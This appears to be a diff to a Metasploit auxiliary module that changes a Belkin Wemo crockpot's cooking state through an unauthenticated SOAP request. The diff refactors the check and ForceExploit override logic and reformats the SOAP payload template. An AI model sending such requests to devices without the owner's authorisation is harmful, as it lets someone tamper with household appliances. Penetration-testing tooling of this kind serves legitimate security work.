@@ -74,9 +74,11 @@ class MetasploitModule < Msf::Auxiliary
 
     checkcode = check
 
-    unless checkcode == Exploit::CheckCode::Appears || datastore['ForceExploit']
-      print_error("#{checkcode[1]}. Set ForceExploit to override.")
-      return
+    unless datastore['ForceExploit']
+      unless checkcode == Exploit::CheckCode::Appears
+        print_error("#{checkcode[1]}. Set ForceExploit to override.")
+        return
+      end
     end
 
     case action.name
@@ -88,9 +90,7 @@ class MetasploitModule < Msf::Auxiliary
       res = send_request_cook('Off', 0)
     end
 
-    time = res.get_xml_document.at('//time')
-
-    unless res && res.code == 200 && time
+    unless res && res.code == 200 && (time = res.get_xml_document.at('//time'))
       print_error("Failed to #{action.name.downcase}, aborting!")
       return
     end
@@ -111,17 +111,17 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def generate_soap_xml(temp, time)
-    <<EOF
-<?xml version="1.0" encoding="utf-8"?>
-<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
-  <s:Body>
-    <u:SetCrockpotState xmlns:u="urn:Belkin:service:basicevent:1">
-      <mode>#{modes[temp]}</mode>
-      <time>#{time}</time>
-    </u:SetCrockpotState>
-  </s:Body>
-</s:Envelope>
-EOF
+    <<~EOF
+      <?xml version="1.0" encoding="utf-8"?>
+      <s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
+        <s:Body>
+          <u:SetCrockpotState xmlns:u="urn:Belkin:service:basicevent:1">
+            <mode>#{modes[temp]}</mode>
+            <time>#{time}</time>
+          </u:SetCrockpotState>
+        </s:Body>
+      </s:Envelope>
+    EOF
   end
 
   def modes
